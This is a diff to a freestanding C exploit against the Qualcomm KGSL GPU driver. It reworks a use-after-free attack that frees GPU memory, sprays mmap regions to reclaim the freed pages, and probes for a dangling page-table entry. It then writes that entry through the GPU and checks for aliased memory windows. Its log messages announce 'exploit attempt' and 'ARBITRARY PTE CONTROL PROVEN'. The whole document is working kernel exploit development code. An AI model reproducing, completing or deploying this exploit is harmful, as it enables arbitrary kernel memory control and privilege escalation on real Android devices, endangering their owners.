@@ -286,35 +286,57 @@ void _start(void){
                     sys2(SYS_munmap,(s64)g_h1,0x1000);
                     struct kgsl_gpumem_free_id f4; f4.id=g_aid; f4.pad=0;
                     sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&f4);
+                    /* reclaim window: allocate PTE regions IMMEDIATELY after the free */
+                    int nr2=0;
+                    for(int q=0;q<32;q++){
+                        s64 r=sys6(SYS_mmap,0,0x10000,3,0x22,-1,0);
+                        if(r<=0) break;
+                        ((volatile u32*)r)[0]=0x4D414700u+(u32)q;
+                        ((volatile u32*)(r+0x1000))[0]=0x4D414900u+(u32)q;
+                        if(nr2<4096) g_regs[nr2++]=(u64)r;
+                    }
+                    out("[R");outdec(round);out("] early regions=");outdec(nr2);out("\n");
                     int dang=probe_mask(1,(u64)g_p_res+0x100,0xA5A5A5A5u,0xFFFFFFFFu,300);
                     out("[R");outdec(round);out("] post-destroy dangling=");outdec(dang);out("\n");
                     if(dang==1){
                         out("[R");outdec(round);out("] DANGLING PTE + PAGES FREED - exploit attempt\n");
-                        int nr2=0; int po2=-1;
-                        s64 r0=sys6(SYS_mmap,0,0x10000,3,0x22,-1,0);
-                        if(r0<=0){ sys3(SYS_sched_yield,0,0,0); r0=sys6(SYS_mmap,0,0x10000,3,0x22,-1,0); }
-                        if(r0>0){
-                            ((volatile u32*)r0)[0]=0x4D414700u;
-                            ((volatile u32*)(r0+0x1000))[0]=0x4D414900u;
-                            g_regs[nr2++]=(u64)r0;
-                            for(int o=0;o<3;o++){
-                                int c=probe_mask(o,(u64)g_p_res+(u64)o*0x1000,0x3,0x3,200);
-                                out("[R");outdec(round);out("] pte-like@");outdec(o*0x1000);out("=");outdec(c);out("\n");
-                                if(c==1){ po2=o; break; }
+                        s64 rsv=sys6(SYS_mmap,0,0x10000000,0,0x22,-1,0);
+                        int nwin=0;
+                        if(rsv>0){
+                            for(int i=0;i<128;i++){
+                                s64 a=rsv+(s64)i*0x200000;
+                                s64 r=sys6(SYS_mmap,a,0x1000,3,0x32,-1,0);
+                                if(r!=a) break;
+                                ((volatile u8*)a)[0]=0x5A;
+                                nwin++;
                             }
-                        } else { out("[R");outdec(round);out("] first region mmap failed rc=");outhex((u64)r0);out("\n"); }
-                        if(po2>=0){
-                            u64 base=(u64)g_p_res+(u64)po2*0x1000;
+                        }
+                        out("[R");outdec(round);out("] aligned windows=");outdec(nwin);out("\n");
+                        int hp=-1;
+                        for(int o=0;o<3;o++){
+                            int c=probe_mask(1,(u64)g_p_res+(u64)o*0x1000,0x3,0x3,300);
+                            out("[R");outdec(round);out("] pte-like@");outdec(o*0x1000);out("=");outdec(c);out("\n");
+                            if(c==1){ hp=o; break; }
+                        }
+                        if(hp>=0 && nwin>0){
+                            u64 base=(u64)g_p_res+(u64)hp*0x1000;
                             u32 pte0=read_dword(3,base,400);
                             out("[R");outdec(round);out("] PTE#0=");outhex(pte0);out("\n");
                             int ww=gpu_write(2,base+8,pte0);
-                            out("[R");outdec(round);out("] wrote PTE#0 rc=");outdec(ww);out("\n");
-                            int hit=-1; u32 hv=0;
-                            for(int q=0;q<nr2;q++){ u32 v=((volatile u32*)(g_regs[q]+0x1000))[0];
-                                if((v & 0xFFFFFF00u)==0x4D414700u){ hit=q; hv=v; break; } }
-                            out("[R");outdec(round);out("] PTE WRITE EFFECT region=");outdec(hit);
-                            if(hit>=0){ out(" page1=");outhex(hv);out("  <== ARBITRARY PTE CONTROL PROVEN\n"); break; }
-                            else out("  (no effect)\n");
+                            out("[R");outdec(round);out("] wrote PTE#0 -> slot1 rc=");outdec(ww);out("\n");
+                            for(int i=0;i<nwin;i++){
+                                s64 a=rsv+(s64)i*0x200000;
+                                ((volatile u32*)a)[0]=0xCAFE0000u+(u32)i;
+                            }
+                            int hit=-1;
+                            for(int i=0;i<nwin;i++){
+                                s64 a=rsv+(s64)i*0x200000;
+                                int c=probe_mask(2,a+0x1000,0xCAFE0000u+(u32)i,0xFFFFFFFFu,120);
+                                if(c==1){ hit=i; break; }
+                            }
+                            out("[R");outdec(round);out("] ALIAS region=");outdec(hit);
+                            if(hit>=0){ out("  <== ARBITRARY PTE CONTROL PROVEN\n"); break; }
+                            else out("  (no alias)\n");
                         } else {
                             g_nb=0;
                             for(int q=0;q<512;q++){ u32 id; u64 gpu; u32*cp;
@@ -334,6 +356,7 @@ void _start(void){
                                 out(found>=0?"  <== GPU WRITE INTO RECLAIMED PAGE\n":"\n");
                             } else out("\n");
                         }
+                        if(rsv>0) sys2(SYS_munmap,(s64)rsv,0x10000000);
                         for(int q=0;q<nr2;q++) sys2(SYS_munmap,(s64)g_regs[q],0x10000);
                         for(int q=0;q<g_nb;q++){ struct kgsl_gpumem_free_id bf; bf.id=g_bids[q]; bf.pad=0; sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&bf); }
                         g_nb=0;
